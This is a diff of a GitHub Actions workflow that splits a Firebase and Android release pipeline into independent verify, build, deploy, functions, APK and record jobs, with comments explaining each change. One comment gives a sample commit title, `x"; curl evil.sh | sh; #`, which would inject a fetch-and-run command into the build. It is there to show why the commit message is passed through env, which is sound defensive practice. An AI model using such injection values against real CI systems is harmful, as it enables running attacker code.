@@ -12,15 +12,41 @@ concurrency:
   cancel-in-progress: true
 
 env:
-  # GitHub gives every push a unique, increasing number.
+  # GitHub gives every push a unique, increasing number. Every job below derives
+  # the version from it independently rather than passing it between them, so
+  # the jobs need no shared state to agree on what they are shipping.
   NATIVE_BUILD_ID: ${{ github.run_number }}
+
+# =============================================================================
+# The pipeline is split so one broken thing stops only what depends on it.
+#
+# It used to be a single job: verify, build, APK, functions, hosting, history,
+# in that order. A Cloud Functions failure therefore blocked the web deploy
+# even though the two share nothing — which is exactly what happened, twice,
+# and left the finished web build unpublished both times.
+#
+#   verify ──┬── build ──┬── web_deploy ──┐
+#            │           │                ├── record
+#            │           └── android ─────┘
+#            └── functions
+#
+#   functions   independent of everything after verify. It can fail all day
+#               without holding up the web app.
+#   build       produces dist/ once and hands it to the two jobs that need it,
+#               so the web assets are not compiled twice.
+#   web_deploy  publishes the site. Does not wait for the APK.
+#   android     builds and uploads the APK. Does not block the site.
+#   record      writes the release history and prunes old APKs, so it waits for
+#               BOTH the site and the APK: it must not advertise or prune
+#               against a release that is only half out.
+# =============================================================================
 
 jobs:
   # ---------------------------------------------------------------------------
   # Nothing used to run before a deploy: the only gate was whether the build
   # command exited zero, and then it published the web app and an APK to every
-  # user. This job is that missing gate. It is cheap (about a minute) and the
-  # deploy job will not start unless it passes.
+  # user. This job is that missing gate. It is cheap (about a minute) and
+  # nothing else starts unless it passes.
   # ---------------------------------------------------------------------------
   verify:
     runs-on: ubuntu-latest
@@ -44,8 +70,9 @@ jobs:
         run: npm test
 
       # The rules decide who can read participant names and phone numbers, and
-      # they are deployed automatically below — so they do not ship unless these
-      # pass against a real Firestore emulator.
+      # a broken ruleset empties the app for everyone — so they are tested
+      # against a real Firestore emulator whether or not this pipeline is the
+      # thing that ships them.
       - name: Setup Java (for the Firestore emulator)
         uses: actions/setup-java@v4
         with:
@@ -55,9 +82,15 @@ jobs:
       - name: Firestore rules tests
         run: npx --yes firebase-tools@13 emulators:exec --only firestore --project imnci-courses-monitor-test "npx vitest run --config vitest.rules.config.js"
 
-  build_and_deploy:
+  # ---------------------------------------------------------------------------
+  # Compiles the web assets and both manifests once. Everything downstream takes
+  # the artifact, so the site the APK wraps is byte-for-byte the site deployed.
+  # ---------------------------------------------------------------------------
+  build:
     needs: verify
     runs-on: ubuntu-latest
+    outputs:
+      build_version: ${{ steps.version.outputs.build_version }}
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
@@ -68,54 +101,25 @@ jobs:
           node-version: '24'
           cache: 'npm'
 
-      - name: Setup Java
-        uses: actions/setup-java@v4
-        with:
-          distribution: 'zulu'
-          java-version: '17'
-          cache: 'gradle'
-
       # npm ci installs exactly what package-lock.json pins. npm install
       # re-resolved every caret range on each run, so two builds of the same
       # commit could ship different dependency code.
       - name: Install Dependencies
         run: npm ci
 
-      # --- STEP 0: CAN THIS RUN ACTUALLY DEPLOY? ---
-      #
-      # Authenticating here rather than just before the APK upload costs
-      # nothing and buys the check below, which asks Google whether the CI
-      # service account holds the permissions the Cloud Functions deploy
-      # needs.
-      #
-      # A release once died on a missing IAM permission at step 5, after a
-      # fifteen-minute Android build and after the signed APK had already
-      # been uploaded to Storage — and the error was a bare 403 from the
-      # Cloud Functions API that named neither the permission nor the
-      # account. Finding that out in the first minute, with the grant
-      # commands printed in the log, is the whole point of this step.
-      - name: Authenticate to Google Cloud
-        uses: google-github-actions/auth@v2
-        with:
-          credentials_json: '${{ secrets.FIREBASE_SERVICE_ACCOUNT_IMNCI_COURSES_MONITOR }}'
-
-      - name: Setup Google Cloud SDK
-        uses: google-github-actions/setup-gcloud@v2
-
-      - name: Check deploy permissions
-        run: bash scripts/preflight-deploy-iam.sh imnci-courses-monitor
-
       - name: Set App Version
+        id: version
         run: |
           RUN_ID=${{ github.run_number }}
           MAJOR=$(( (RUN_ID / 10) + 1 ))
           MINOR=$(( RUN_ID % 10 ))
           BUILD_VERSION="${MAJOR}.${MINOR}.0"
           echo "BUILD_VERSION=$BUILD_VERSION" >> $GITHUB_ENV
-          # The version now lives in package.json, which vite.config.js reads.
-          # Writing only .env no longer works: vite.config.js sets
+          echo "build_version=$BUILD_VERSION" >> $GITHUB_OUTPUT
+          # The version lives in package.json, which vite.config.js reads.
+          # Writing only .env does not work: vite.config.js sets
           # VITE_APP_VERSION with `define`, and define always wins over .env,
-          # so the app would have shown package.json's old version instead.
+          # so the app would show package.json's old version instead.
           npm version "$BUILD_VERSION" --no-git-tag-version --allow-same-version
           # Kept as well, so any code still reading the variable directly agrees.
           echo "VITE_APP_VERSION=${BUILD_VERSION}" > .env
@@ -124,6 +128,7 @@ jobs:
       # A commit message containing [force-update] makes the new APK required.
       # Before, EVERY push set mandatory: true, so users were blocked by a
       # full APK download on every single release.
+      #
       # COMMIT_MESSAGE goes through `env:` rather than being expanded straight
       # into the script. A `${{ }}` expression is pasted in as literal text
       # before bash sees the line, so a commit titled `x"; curl evil.sh | sh; #`
@@ -142,22 +147,18 @@ jobs:
       - name: Build Web Assets
         run: npm run build
 
-      # --- STEP 1: CREATE THE OTA BUNDLE FOR NATIVE ---
       - name: Create Web Update Manifests
         env:
           COMMIT_MESSAGE: ${{ github.event.head_commit.message }}
         run: |
           FIREBASE_URL="https://imnci-courses-monitor.web.app"
           ZIP_NAME="update-${{ env.BUILD_VERSION }}.zip"
-          echo "ZIP_NAME=$ZIP_NAME" >> $GITHUB_ENV
           cd dist
           zip -r ../${ZIP_NAME} .
           cd ..
           # Capgo checks this against the file it downloads. Without it, a
           # half-downloaded or corrupted zip is installed and the app then
           # fails to start, so Capgo restores the previous version.
-          # If your Capgo version rejects the format, delete the checksum line
-          # from update.json below.
           CHECKSUM=$(sha256sum ${ZIP_NAME} | cut -d ' ' -f1)
           mkdir -p dist/latest
           mv ${ZIP_NAME} dist/latest/
@@ -177,14 +178,181 @@ jobs:
             > dist/latest/update.json
           cat dist/latest/update.json
 
-      # --- STEP 2: BUILD AND SIGN THE APK ---
+      # The APK URL is built from the version, not from the upload result, so
+      # this manifest can be written before the APK exists. AdminDashboard.jsx
+      # fetches it to show which native build is current.
+      - name: Create Native JSON Manifest
+        run: |
+          mkdir -p public
+          STORAGE_URL="https://firebasestorage.googleapis.com/v0/b/imnci-courses-monitor.firebasestorage.app/o/apks%2FNational_Child_Health_Program_APP_v${{ env.BUILD_VERSION }}.apk?alt=media"
+          # The app reads `apkUrl` from Firestore (meta/update_config), which
+          # scripts/push-update.js maintains. Both names are written here for
+          # the admin screen, which reads this file directly.
+          jq -n \
+            --argjson latestNativeBuild ${{ env.NATIVE_BUILD_ID }} \
+            --arg versionString "${{ env.BUILD_VERSION }}" \
+            --arg url "$STORAGE_URL" \
+            --argjson mandatory ${{ env.IS_MANDATORY }} \
+            '{latestNativeBuild: $latestNativeBuild, versionString: $versionString,
+              apkUrl: $url, downloadUrl: $url, mandatory: $mandatory,
+              message: ("New version " + $versionString + " is available."),
+              releaseNotes: ("Automated deployment for v" + $versionString)}' \
+            > public/native-version.json
+          cp public/native-version.json dist/native-version.json
+          cat public/native-version.json
+
+      - name: Upload web build
+        uses: actions/upload-artifact@v4
+        with:
+          name: dist
+          path: dist
+          retention-days: 3
+
+  # ---------------------------------------------------------------------------
+  # Publishes the site. Needs only the build — not the APK, and not functions.
+  # ---------------------------------------------------------------------------
+  web_deploy:
+    needs: build
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Download web build
+        uses: actions/download-artifact@v4
+        with:
+          name: dist
+          path: dist
+
+      - name: Deploy to Firebase Hosting
+        uses: FirebaseExtended/action-hosting-deploy@v0
+        with:
+          firebaseServiceAccount: "${{ secrets.FIREBASE_SERVICE_ACCOUNT_IMNCI_COURSES_MONITOR }}"
+          channelId: live
+          projectId: "imnci-courses-monitor"
+
+      # Confirms the update file is really live before anything tells devices
+      # about it.
+      - name: Verify update.json is live
+        run: |
+          for i in 1 2 3 4 5; do
+            LIVE=$(curl -fsSL "https://imnci-courses-monitor.web.app/latest/update.json?t=$(date +%s)" || echo "")
+            echo "$LIVE"
+            if echo "$LIVE" | grep -q "${{ needs.build.outputs.build_version }}"; then
+              echo "update.json is live."
+              exit 0
+            fi
+            echo "Not live yet, waiting..."
+            sleep 15
+          done
+          echo "::error::update.json did not show the new version. Check the Cache-Control headers in firebase.json."
+          exit 1
+
+  # ---------------------------------------------------------------------------
+  # Cloud Functions. Independent of the web app on purpose: the two have failed
+  # for unrelated reasons (an IAM grant, then a missing npm install, then an
+  # extensions API permission) and each time the site was held hostage by it.
+  # ---------------------------------------------------------------------------
+  functions:
+    needs: verify
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '24'
+          cache: 'npm'
+
+      - name: Authenticate to Google Cloud
+        uses: google-github-actions/auth@v2
+        with:
+          credentials_json: '${{ secrets.FIREBASE_SERVICE_ACCOUNT_IMNCI_COURSES_MONITOR }}'
+
+      - name: Setup Google Cloud SDK
+        uses: google-github-actions/setup-gcloud@v2
+
+      # Asks Google which of the permissions a deploy needs the CI account
+      # actually holds, and prints the exact grant commands for the ones it does
+      # not. Runs in seconds, before anything is built.
+      - name: Check deploy permissions
+        run: bash scripts/preflight-deploy-iam.sh imnci-courses-monitor
+
+      # The root npm ci installs the app's dependencies, not the functions'.
+      # functions/ is a separate package with its own lockfile, and without this
+      # the deploy fails with "Cannot find module 'firebase-functions/v2/https'"
+      # — the CLI parses index.js in place to discover the triggers, so the
+      # packages have to be on disk first.
+      - name: Install Cloud Functions dependencies
+        working-directory: functions
+        run: npm ci
+
+      # SECURITY RULES ARE NOT DEPLOYED HERE, on purpose. A rules mistake takes
+      # the whole app down for everyone at once, and the failure looks like
+      # "this screen is empty" rather than an error anyone can act on. They go
+      # out as a separate, deliberate step:
+      #
+      #     npm run test:rules && npm run deploy:rules
+      - name: Deploy Cloud Functions
+        run: |
+          npx --yes firebase-tools@13 deploy \
+            --only functions \
+            --project imnci-courses-monitor \
+            --non-interactive \
+            --force
+
+  # ---------------------------------------------------------------------------
+  # The APK. Wraps the same dist/ the site was built from, so the two cannot
+  # drift apart within a release.
+  # ---------------------------------------------------------------------------
+  android:
+    needs: build
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '24'
+          cache: 'npm'
+
+      - name: Setup Java
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'zulu'
+          java-version: '17'
+          cache: 'gradle'
+
+      - name: Install Dependencies
+        run: npm ci
+
+      - name: Download web build
+        uses: actions/download-artifact@v4
+        with:
+          name: dist
+          path: dist
+
+      - name: Authenticate to Google Cloud
+        uses: google-github-actions/auth@v2
+        with:
+          credentials_json: '${{ secrets.FIREBASE_SERVICE_ACCOUNT_IMNCI_COURSES_MONITOR }}'
+
+      - name: Setup Google Cloud SDK
+        uses: google-github-actions/setup-gcloud@v2
+
       - name: Build and Sign Native APK
+        env:
+          BUILD_VERSION: ${{ needs.build.outputs.build_version }}
         run: |
           # The old script ended these two lines with "|| true", so a failed
           # replacement was hidden and the APK kept the previous versionCode.
           # Android then refuses to install it as an update.
           sed -i -e "s/versionCode [0-9]*/versionCode ${{ env.NATIVE_BUILD_ID }}/g" android/app/build.gradle
-          sed -i -e "s/versionName \".*\"/versionName \"${{ env.BUILD_VERSION }}\"/g" android/app/build.gradle
+          sed -i -e "s/versionName \".*\"/versionName \"${BUILD_VERSION}\"/g" android/app/build.gradle
           grep -E "versionCode|versionName" android/app/build.gradle
           npx cap sync android
           # Fails the build early if a plugin is in package.json but missing
@@ -215,111 +383,65 @@ jobs:
           rm -f app/nchp-release.keystore
           cd ..
 
-      # --- STEP 3: NATIVE VERSION MANIFEST ---
-      - name: Create Native JSON Manifest
-        run: |
-          mkdir -p public
-          STORAGE_URL="https://firebasestorage.googleapis.com/v0/b/imnci-courses-monitor.firebasestorage.app/o/apks%2FNational_Child_Health_Program_APP_v${{ env.BUILD_VERSION }}.apk?alt=media"
-          # IMPORTANT: the app reads the field "apkUrl" from Firestore
-          # (meta/update_config). The old file only had "downloadUrl", so the
-          # Download button had nothing to open. Both names are written now;
-          # make sure scripts/push-update.js copies apkUrl into Firestore.
-          cat <<EOF > public/native-version.json
-          {
-            "latestNativeBuild": ${{ env.NATIVE_BUILD_ID }},
-            "versionString": "${{ env.BUILD_VERSION }}",
-            "apkUrl": "${STORAGE_URL}",
-            "downloadUrl": "${STORAGE_URL}",
-            "mandatory": ${{ env.IS_MANDATORY }},
-            "message": "New version ${{ env.BUILD_VERSION }} is available.",
-            "releaseNotes": "Automated deployment for v${{ env.BUILD_VERSION }}"
-          }
-          EOF
-          cp public/native-version.json dist/native-version.json
-          cat public/native-version.json
-
-      # --- STEP 4: UPLOAD THE APK ---
-      # Google Cloud authentication happened in step 0, so gcloud is ready.
       - name: Upload APK to Firebase Cloud Storage
+        env:
+          BUILD_VERSION: ${{ needs.build.outputs.build_version }}
         run: |
           gcloud storage cp \
             android/app/build/outputs/apk/release/app-release-aligned.apk \
-            gs://imnci-courses-monitor.firebasestorage.app/apks/National_Child_Health_Program_APP_v${{ env.BUILD_VERSION }}.apk \
+            gs://imnci-courses-monitor.firebasestorage.app/apks/National_Child_Health_Program_APP_v${BUILD_VERSION}.apk \
             --cache-control="public, max-age=31536000, immutable"
           # The ?alt=media link only works if the file can be read without a
           # login. If your Storage rules require authentication, users get a
           # 403 and the Download button appears to do nothing.
-          # If your bucket does NOT use uniform bucket-level access, uncomment:
-          # gcloud storage objects update \
-          #   gs://imnci-courses-monitor.firebasestorage.app/apks/National_Child_Health_Program_APP_v${{ env.BUILD_VERSION }}.apk \
-          #   --add-acl-grant=entity=AllUsers,role=READER
 
-      # --- STEP 5: CLOUD FUNCTIONS ---
-      #
-      # These must go out BEFORE the web app, not after.
-      #
-      # The browser no longer creates its own users/{uid} document — that was
-      # the path that let any signed-in account grant itself super_user. The
-      # createUserProfile trigger writes it now, so a web release that reached
-      # users before the functions did would leave every new sign-up unable to
-      # get a profile at all.
-      #
-      # SECURITY RULES ARE NOT DEPLOYED HERE, on purpose. A rules mistake takes
-      # the whole app down for everyone at once, and the failure looks like
-      # "this screen is empty" rather than an error anyone can act on. They go
-      # out as a separate, deliberate step:
-      #
-      #     npm run test:rules && npm run deploy:rules
-      #
-      # The rules tests still run in the verify job above, so a broken ruleset
-      # fails CI whether or not this pipeline is the thing that ships it.
-      #
-      # The root `npm ci` above installs the app's dependencies, not the
-      # functions'. functions/ is a separate package with its own lockfile, and
-      # without this step the deploy fails with "Cannot find module
-      # 'firebase-functions/v2/https'" — the CLI parses index.js in place to
-      # discover the triggers, so the packages have to be on disk first. It
-      # worked locally only because functions/node_modules already existed
-      # there.
-      - name: Install Cloud Functions dependencies
-        working-directory: functions
+  # ---------------------------------------------------------------------------
+  # Release history and old-APK cleanup. Waits for BOTH the site and the APK:
+  # push-update.js prunes APKs relative to the live build, so running it while
+  # half the release is out could delete a build users still depend on.
+  # ---------------------------------------------------------------------------
+  record:
+    needs: [build, web_deploy, android]
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '24'
+          cache: 'npm'
+
+      - name: Install Dependencies
         run: npm ci
 
-      # google-github-actions/auth ran above, so GOOGLE_APPLICATION_CREDENTIALS
-      # is already set for the CLI.
-      - name: Deploy Cloud Functions
-        run: |
-          npx --yes firebase-tools@13 deploy \
-            --only functions \
-            --project imnci-courses-monitor \
-            --non-interactive \
-            --force
-
-      # --- STEP 6: DEPLOY THE WEB APP ---
-      - name: Deploy to Firebase Hosting
-        uses: FirebaseExtended/action-hosting-deploy@v0
+      - name: Download web build
+        uses: actions/download-artifact@v4
         with:
-          firebaseServiceAccount: "${{ secrets.FIREBASE_SERVICE_ACCOUNT_IMNCI_COURSES_MONITOR }}"
-          channelId: live
-          projectId: "imnci-courses-monitor"
+          name: dist
+          path: dist
 
-      # Confirms the update file is really live before we tell devices about it.
-      - name: Verify update.json is live
+      # push-update.js reads public/native-version.json, and a checked-out
+      # public/native-version.json is the STALE copy committed to the repo — it
+      # still says v1.1.0, build 2. In the old single job the generate step had
+      # already overwritten it in the same workspace; this job is a fresh
+      # checkout, so it has to take the generated manifest from the build
+      # artifact instead. Without this the release history would name an APK
+      # that was never built, and the cleanup would prune against build 2.
+      - name: Restore the generated native manifest
         run: |
-          for i in 1 2 3 4 5; do
-            LIVE=$(curl -fsSL "https://imnci-courses-monitor.web.app/latest/update.json?t=$(date +%s)" || echo "")
-            echo "$LIVE"
-            if echo "$LIVE" | grep -q "${{ env.BUILD_VERSION }}"; then
-              echo "update.json is live."
-              exit 0
-            fi
-            echo "Not live yet, waiting..."
-            sleep 15
-          done
-          echo "::error::update.json did not show the new version. Check the Cache-Control headers in firebase.json."
-          exit 1
+          mkdir -p public
+          cp dist/native-version.json public/native-version.json
+          # Belt and braces: refuse to record a release the build did not make.
+          EXPECTED="${{ needs.build.outputs.build_version }}"
+          ACTUAL=$(jq -r '.versionString' public/native-version.json)
+          if [ "$ACTUAL" != "$EXPECTED" ]; then
+            echo "::error::native-version.json says $ACTUAL but this run built $EXPECTED."
+            exit 1
+          fi
+          cat public/native-version.json
 
-      # --- STEP 7: RECORD IN FIRESTORE AND CLEAN UP ---
       - name: Push Update History and Cleanup Old APKs
         env:
           FIREBASE_SERVICE_ACCOUNT: ${{ secrets.FIREBASE_SERVICE_ACCOUNT_IMNCI_COURSES_MONITOR }}
